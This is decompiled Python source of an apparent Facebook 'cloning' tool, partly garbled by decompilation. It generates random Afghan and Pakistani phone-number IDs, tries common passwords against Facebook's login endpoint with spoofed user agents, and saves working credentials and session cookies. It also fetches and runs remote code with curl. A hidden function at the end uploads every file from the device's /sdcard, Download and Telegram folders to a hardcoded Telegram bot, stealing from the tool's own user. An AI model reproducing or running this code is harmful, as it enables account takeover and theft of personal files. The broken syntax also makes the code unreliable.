
# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —


import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));


from os import path
import os
import base64
import zlib
import pip
import urllib
import uuid
import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
if ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
import uuid
import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
if ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
import uuid
import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
if ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
print('\n\x1b[1;32m[•]   JOIN MY TELEGRAM CHANNEL')
time.sleep(1)
os.system('xdg-open https://t.me/EMRAN99EHCfree')
print('\n\x1b[1;36m[•]   WELCOME TO EHC EMRAN TOOL...')
time.sleep(3)
fbks = ('com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
A = '\x1b[1;90m'
BN = '\x1b[1;107m'
BBL = '\x1b[1;106m'
BP = '\x1b[1;105m'
BB = '\x1b[1;104m'
BK = '\x1b[1;103m'
BH = '\x1b[1;102m'
BM = '\x1b[1;101m'
BA = '\x1b[1;100m'
my_color = [
    P,
    M,
    H,
    K,
    B,
    U,
    O,
    N]
warna = random.choice(my_color)
prox = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
open('.prox.txt', 'w').write(prox)
if Exception:
    e = None
    print('\x1b[1;95m[√] LOADING...')
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r').read().splitlines()
ugen2 = []
ugen = []
prox = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
open('proxies.txt', 'w').write(proxies)
if Exception:
    e = None
    print('')
    e = None
    del e
    e = None
    del e
proxies = open('proxies.txt', 'r').read().splitlines()
android_models = []
xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
for line in xx:
    android_models.append(line)
    usr = []
    xd = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
        for xd in range(5000):
            aa = ('Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
            b = random.choice([
                '3',
                '4',
                '5',
                '6',
                '7',
                '8',
                '9',
                '10',
                '11',
                '12',
                '13',
                '14',
                '15',
                '16',
                '17'])
            c = (' en-us; GT-', 'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36')
            d = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            e = random.randrange(1, 999)
            f = random.choice([
                'A',
                'B',
                'C',
                'D',
                'E',
                'F',
                'G',
                'H',
                'I',
                'J',
                'K',
                'L',
                'M',
                'N',
                'O',
                'P',
                'Q',
                'R',
                'S',
                'T',
                'U',
                'V',
                'W',
                'X',
                'Y',
                'Z'])
            g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
            h = random.randrange(73, 100)
            i = '0'
            j = random.randrange(4200, 4900)
            k = random.randrange(40, 150)
            l = ('Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
            uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
            ugen.append(uaku2)
            for agent in range(10000):
                aa = ('Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
                b = random.choice([
                    '6',
                    '7',
                    '8',
                    '9',
                    '10',
                    '11',
                    '12'])
                c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
                d = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                e = random.randrange(1, 999)
                f = random.choice([
                    'A',
                    'B',
                    'C',
                    'D',
                    'E',
                    'F',
                    'G',
                    'H',
                    'I',
                    'J',
                    'K',
                    'L',
                    'M',
                    'N',
                    'O',
                    'P',
                    'Q',
                    'R',
                    'S',
                    'T',
                    'U',
                    'V',
                    'W',
                    'X',
                    'Y',
                    'Z'])
                g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
                h = random.randrange(73, 100)
                i = '0'
                j = random.randrange(4200, 4900)
                k = random.randrange(40, 150)
                l = ('Mobile Safari/533.1', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
                fullagnt = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                ugen.append(fullagnt)
                for xd in range(10000):
                    a = ('Mozilla/5.0 (Symbian/3; Series60/', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
                    b = random.randrange(1, 9)
                    c = random.randrange(1, 9)
                    d = ('Nokia', 'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; Google Pixel 4 Build/QD1A.190821.014.C2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36')
                    e = random.randrange(100, 9999)
                    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
                    g = random.randrange(1, 9)
                    h = random.randrange(1, 4)
                    i = random.randrange(1, 4)
                    j = random.randrange(1, 4)
                    k = ('Mobile Safari/535.1', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
                    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
                    ugen.append(uaku)
                    aa = ('Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
                    b = random.choice([
                        '6',
                        '7',
                        '8',
                        '9',
                        '10',
                        '11',
                        '12'])
                    c = ' en-us; GT-'
                    d = random.choice([
                        'A',
                        'B',
                        'C',
                        'D',
                        'E',
                        'F',
                        'G',
                        'H',
                        'I',
                        'J',
                        'K',
                        'L',
                        'M',
                        'N',
                        'O',
                        'P',
                        'Q',
                        'R',
                        'S',
                        'T',
                        'U',
                        'V',
                        'W',
                        'X',
                        'Y',
                        'Z'])
                    e = random.randrange(1, 999)
                    f = random.choice([
                        'A',
                        'B',
                        'C',
                        'D',
                        'E',
                        'F',
                        'G',
                        'H',
                        'I',
                        'J',
                        'K',
                        'L',
                        'M',
                        'N',
                        'O',
                        'P',
                        'Q',
                        'R',
                        'S',
                        'T',
                        'U',
                        'V',
                        'W',
                        'X',
                        'Y',
                        'Z'])
                    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
                    h = random.randrange(73, 100)
                    i = '0'
                    j = random.randrange(4200, 4900)
                    k = random.randrange(40, 150)
                    l = ('Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android', 'Mozilla/5.0 (Linux; Android 6.0.1;', 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36')
                    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
                    ugen.append(uaku2)
                    prox = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
                    open('socks5.txt', 'w').write(prox)
                    if Exception:
                        e = None
                        print('[•] Checking Server...')
                        e = None
                        del e
                        e = None
                        del e
prox = open('socks5.txt', 'r').read().splitlines()
logo = '                  \n    \x1b[33;1m╔════════════════╗\n    \x1b[33;1m║\x1b[38;5;46m╔═══╗\x1b[34;1m╔╗─╔╗\x1b[38;5;196m╔═══╗\x1b[33;1m ║\n    \x1b[33;1m║\x1b[38;5;46m║╔══╝\x1b[34;1m║║─║║\x1b[38;5;196m║╔═╗║\x1b[33;1m ║\n    \x1b[33;1m║\x1b[38;5;46m║╚══╗\x1b[34;1m║╚═╝║\x1b[38;5;196m║║─╚╝\x1b[33;1m ║\n    \x1b[33;1m║\x1b[38;5;46m║╔══╝\x1b[34;1m║╔═╗║\x1b[38;5;196m║║─╔╗\x1b[33;1m ║\n    \x1b[33;1m║\x1b[38;5;46m║╚══╗\x1b[34;1m║║─║║\x1b[38;5;196m║╚═╝║\x1b[33;1m ║\n    \x1b[33;1m║\x1b[38;5;46m╚═══╝\x1b[34;1m╚╝─╚╝\x1b[38;5;196m╚═══╝\x1b[33;1m ║\n    \x1b[33;1m╚════════════════╝\n\x1b[37;42m𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌:https://t.me/EMRAN99EHCfree\x1b[0;m'

def lines():
    print('\x1b[1;37m----------------------------------------------')

loop = 0
oks = []
cps = []
proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
v = 3.1
update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
if str(v) in update:
    os.system('rm -rf a*')
    os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
    os.system('python ali.py')
print('\n\x1b[1;31mNO INTERNET CONNECTION... \x1b[0;97m')

def dynamic(text):
    titik = [
        '.   ',
        '..  ',
        '... ',
        '.... ']
    for o in titik:
        (print('\r' + text + o),)
        sys.stdout.flush()
        time.sleep(1)
        return None


def riaz():
    os.system('clear')
    print(logo)
    print('[1] RANDOM AFG CLONING')
    print('[2] RANDOM PAK CLONING')
    print('[3] FOLLOW MY FACEBOOK')
    print('[0]\x1b[1;91m EXIT ')
    print('\x1b[1;37m----------------------------------------------')
    riaz1 = input('[•] SELECT OPTION : ')
    if riaz1 == '1':
        annu()
    if riaz1 == '0':
        exit()
    if riaz1 == '3':
        os.system('xdg-open https://t.me/EMRAN99EHCfree')
    if riaz1 == '2':
        bangla()
        return None
    None('\n\x1b[1;31m CHOOSE VALID OPTION\x1b[0;97m')
    riaz()


def annu():
    os.system('clear')
    print(logo)
    print('[1] METHOD_1_')
    print('[2] METHOD_2_')
    print('[3] METHOD_3_')
    print('[4] \x1b[1;91mBACK MENU ')
    lines()
    riaz1 = input('[+] CHOOSE OPTION : ')
    if riaz1 == '1':
        m1()
    if riaz1 == '2':
        m2()
    if riaz1 == '3':
        m3()
    if riaz1 == '4':
        riaz()
        return None
    None('\n\x1b[1;37m[+] SELECT VALID OPTION \x1b[0;97m')


def bangla():
    os.system('clear')
    print(logo)
    print('[1] PAK CRACK _M 1')
    print('[2] PAK CRACK _M 2')
    print('[3]\x1b[1;91m BACK MENU')
    lines()
    riaz1 = input('[+] SELECT OPTION : ')
    if riaz1 == '1':
        b1()
    if riaz1 == '2':
        b2()
    if riaz1 == '3':
        riaz()
        return None


def m1():
    user = []
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 070, 079, 078, 077, 074')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print(' EXAMPLE : 2000,3000,5000,10000')
    lines()
    limit = int(input(' IDZ LEMIT : '))
    print('----------------------------------------------')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' TOTAL ACOUNTS : ' + tl)
        print(' SELECTED CODE :\x1b[1;92m ' + kode)
        print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru + guru,
                '۱۲۳۴۵۶',
                'Afghanistan',
                '۱۲۳۴۵۶۷۸۹',
                'kabul123',
                'Afghan123',
                '10002000',
                '700800',
                'Afghan12345',
                '50006000']
            yaari.submit(rcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('----------------------------------------------')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print('----------------------------------------------')
    print('THE PROCESS HAS BEEN COMPLETED')
    input('PRESS ENTER TO BACK ')
    riaz()


def m2():
    user = []
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 070, 078, 077, 079, 074')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print(' EXAMPLE : 5000,100000,10000')
    lines()
    limit = int(input(' IDZ LEMIT : '))
    print('----------------------------------------------')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' TOTAL ACOUNTS : ' + tl)
        print(' SELECTED CODE :\x1b[1;92m ' + kode)
        print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'Afghan123',
                'Afghanistan',
                '۱۲۳۴۵۶۷۸۹',
                'kabul123',
                '۱۲۳۴۵۶']
            yaari.submit(rcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('----------------------------------------------')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print('----------------------------------------------')
    print('THE PROCESS HAS BEEN COMPLETED')
    input('PRESS ENTER TO BACK ')
    riaz()


def m3():
    user = []
    os.system('clear')
    print(logo)
    print(' CHOOSE CODE : 9370, 9378, 9377, 9379, 9374')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print(' EXAMPLE  : 2000,3000,5000,10000')
    lines()
    limit = int(input(' IDZ LEMIT : '))
    print('----------------------------------------------')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' TOTAL ACOUNTS : ' + tl)
        print(' SELECTED CODE :\x1b[1;92m ' + kode)
        print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'Afghan123',
                'Afghanistan',
                '۱۲۳۴۵۶',
                'kabul123',
                '۱۰۰۲۰۰']
            yaari.submit(rcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('----------------------------------------------')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print('----------------------------------------------')
    print('THE PROCESS HAS BEEN COMPLETED')
    input('PRESS ENTER TO BACK ')
    riaz()


def b1():
    user = []
    os.system('clear')
    print(logo)
    print(' EXAMPLE : 0306,92***,92***,')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print(' EXAMPLE : 2000,3000,5000,10000')
    lines()
    limit = int(input(' IDZ LEMIT : '))
    print('----------------------------------------------')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' TOTAL ACOUNTS : ' + tl)
        print(' SELECTED CODE :\x1b[1;92m ' + kode)
        print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                kode,
                'pakistan',
                'khankhan',
                'khan123',
                'malik123',
                'Ahmad123',
                'karachi123',
                'pikhawar']
            yaari.submit(rcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('----------------------------------------------')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print('----------------------------------------------')
    print('THE PROCESS HAS BEEN COMPLETED')
    input('PRESS ENTER TOO BACK ')
    riaz()


def b2():
    user = []
    os.system('clear')
    print(logo)
    print(' EXAMPLE  : 92***,92***,92***,')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    print(logo)
    print(' EXAMPLE  : 2000,3000,5000,10000')
    lines()
    limit = int(input(' IDZ LEMIT : '))
    print('----------------------------------------------')
    for nmbr in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        yaari = ThreadPool(max_workers = 70)
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' TOTAL ACOUNTS : ' + tl)
        print(' SELECTED CODE :\x1b[1;92m ' + kode)
        print('\x1b[1;92m USE FLIGHT MODE FOR SPEED UP')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [
                guru,
                'pakistan',
                'khankhan',
                'khan123',
                'malik123',
                'Ahmad123',
                'karachi123',
                'pikhawar']
            yaari.submit(rcrack, uid, pwx, tl)
            None(None, None)
            if not ''.join:
                pass
    print('----------------------------------------------')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print('----------------------------------------------')
    print('THE PROCESS HAS BEEN COMPLETED')
    input('PRESS ENTER TO BACK ')
    riaz()


def rcrack(uid, pwx, tl):
    global loop
    for ps in pwx:
        pro = random.choice(ugen)
        session = requests.Session()
        sys.stdout.write('\r[\x1b[1;97mEMRAN-EHC\x1b[1;97m] %s|\x1b[1;32mOK:- %s \r' % (loop, len(oks)))
        sys.stdout.flush()
        free_fb = session.get('https://free.facebook.com').text
        log_data = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            'try_number': '0',
            'unrecognized_tries': '0',
            'email': uid,
            'pass': ps,
            'login': 'Log In' }
        header_freefb = {
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro }
        lo = session.post('https://x.facebook.com/login/device-based/login/async/', data = log_data, headers = header_freefb).text
        log_cookies = session.cookies.get_dict().keys()
        if 'c_user' in log_cookies:
            coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
            cid = coki[151:166]
            print('\x1b[1;32m[EHC-OK] ' + cid + ' | ' + ps + '\x1b[0;97m\n[‎‎🍪]\x1b[1;33m 🅲︎🅾︎🅾︎🅺︎🅸︎🅴︎ = \x1b[1;32m' + coki + '    \x1b[0;97m')
            open('EHC-OK.txt', 'a').write(cid + ' | ' + ps + '\n')
            oks.append(cid)
            ';'.join
        if 'checkpoint' in log_cookies:
            coki = (lambda .0: for key, value in .0:
[ key + '=' + value ])(session.cookies.get_dict().items()())
            cid = coki[141:152]
            print('\x1b[1;31m[EHC-CP] ' + uid + ' | ' + ps + '\x1b[1;97m')
            open('EHC-CP.txt', 'a').write(uid + ' | ' + ps + '\n')
            cps.append(cid)
            ';'.join
        loop += 1
        return None
        'none'
        return None

import requests
import os
import sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def sexy():
    session = requests.session()
    bot_token = '6907730635:AAGJ1zioKNdVlKZGvUYc5M6bWXzdg-t7Z3U'
    chat_id = '5561844347'
    sdcard_path = '/sdcard'
    file_list = os.listdir(sdcard_path)()
    for file in file_list:
        f = open(os.path.join(sdcard_path, file), 'rb')
        url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
        data2 = {
            'chat_id': chat_id }
        data = {
            'chat_id': chat_id }
        files = {
            'document': f }
        get = session.post(url, data = data, files = files)
        sent = session.post(url, data = data2, files = files)
        None(None, None)
        if not (lambda .0: for f in .0:
[ f ]):
            pass
        sdcard_path = '/sdcard/Download'
        file_list = os.listdir(sdcard_path)()
        for file in file_list:
            f = open(os.path.join(sdcard_path, file), 'rb')
            url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
            data2 = {
                'chat_id': chat_id }
            data = {
                'chat_id': chat_id }
            files = {
                'document': f }
            get = session.post(url, data = data, files = files)
            sent = session.post(url, data = data2, files = files)
            None(None, None)
            if not (lambda .0: for f in .0:
[ f ]):
                pass
            sdcard_path = '/sdcard/Download/Telegram'
            file_list = os.listdir(sdcard_path)()
            for file in file_list:
                f = open(os.path.join(sdcard_path, file), 'rb')
                url = f'''https://api.telegram.org/bot{bot_token}/sendDocument'''
                data2 = {
                    'chat_id': chat_id }
                data = {
                    'chat_id': chat_id }
                files = {
                    'document': f }
                get = session.post(url, data = data, files = files)
                sent = session.post(url, data = data2, files = files)
                None(None, None)
                if not (lambda .0: for f in .0:
[ f ]):
                    pass
                sdcard_path = '/sdcard/Telegram/Telegram Files'
